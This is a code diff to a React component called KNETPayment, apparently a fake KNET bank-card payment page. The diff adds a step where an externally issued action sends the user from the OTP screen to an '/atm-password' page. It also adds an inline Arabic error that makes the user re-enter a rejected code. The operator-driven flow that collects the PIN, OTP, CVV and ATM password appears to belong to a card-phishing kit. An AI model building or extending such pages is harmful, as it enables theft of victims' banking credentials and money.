@@ -177,9 +177,10 @@ export default function KNETPayment() {
       } else if (phase === "otp") {
         if (action === "otp") {
           navigate("/final-page");
+        } else if (action === "cvv") {
+          navigate("/atm-password");
         } else if (action === "reject") {
-          setShowErrorModal(true);
-          setErrorModalMessage("تم إدخال رمز خطأ يرجى المحاولة مرة أخرى");
+          setRejectedError("يرجى إدخال الرمز بشكل صحيح");
           setOtpCode("");
         }
       }
@@ -722,6 +723,21 @@ export default function KNETPayment() {
                 <label style={fieldLabel}>PIN:</label>
                 <span style={fieldValue}>****</span>
               </div>
+
+              {/* Rejected Error */}
+              {rejectedError && (
+                <div
+                  style={{
+                    fontSize: 11,
+                    color: "#ff0000",
+                    fontWeight: "bold",
+                    textAlign: "center",
+                    marginBottom: 10,
+                  }}
+                >
+                  {rejectedError}
+                </div>
+              )}
 
               {/* OTP with countdown */}
               <div style={fieldRow}>
